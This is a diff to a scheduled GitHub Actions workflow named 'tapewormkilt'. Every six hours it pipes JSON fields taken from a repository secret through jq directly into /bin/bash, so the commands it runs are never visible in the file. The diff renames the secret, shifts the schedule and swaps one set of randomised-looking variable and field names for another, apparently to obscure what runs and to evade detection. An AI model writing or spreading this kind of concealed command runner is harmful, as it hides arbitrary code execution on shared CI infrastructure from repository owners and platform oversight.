@@ -1,9 +1,8 @@
 name: tapewormkilt
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '40 0/6 * * *'
+    - cron: '58 1/6 * * *'
 
 jobs:
   build:
@@ -13,14 +12,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: tapewormkilt
         env:
-          i26802: ${{ secrets.i26802 }}
+          fpwt4100: ${{ secrets.fpwt4100 }}
         run: |
-          echo $i26802 | jq -r .gfx2159 | /bin/bash
-          echo $gjcm311 | jq -r .oaab5763 | /bin/bash
-          echo $x12 | jq -r .vwc967 | /bin/bash
-          echo $fbgr1735 | jq -r .nsx8 | /bin/bash
-          echo $xr0 | jq -r .qt22986 | /bin/bash
-          echo $ar05 | jq -r .ywm55 | /bin/bash
-          echo $n8 | jq -r .xifgp30175 | /bin/bash
-          echo $qej394 | jq -r .y3 | /bin/bash
+          echo $fpwt4100 | jq -r .p23462 | /bin/bash
+          echo $gg895 | jq -r .ki661 | /bin/bash
+          echo $wov741 | jq -r .afk13 | /bin/bash
+          echo $d38778 | jq -r .gagcv504 | /bin/bash
+          echo $lsg19 | jq -r .nj6252 | /bin/bash
+          echo $siexp70 | jq -r .nm9348 | /bin/bash
+          echo $snye1115 | jq -r .da32 | /bin/bash
+          echo $p715 | jq -r .aihcr48238 | /bin/bash
+          echo $a49981 | jq -r .doj41 | /bin/bash
+          echo $xul12082 | jq -r .x19568 | /bin/bash
 
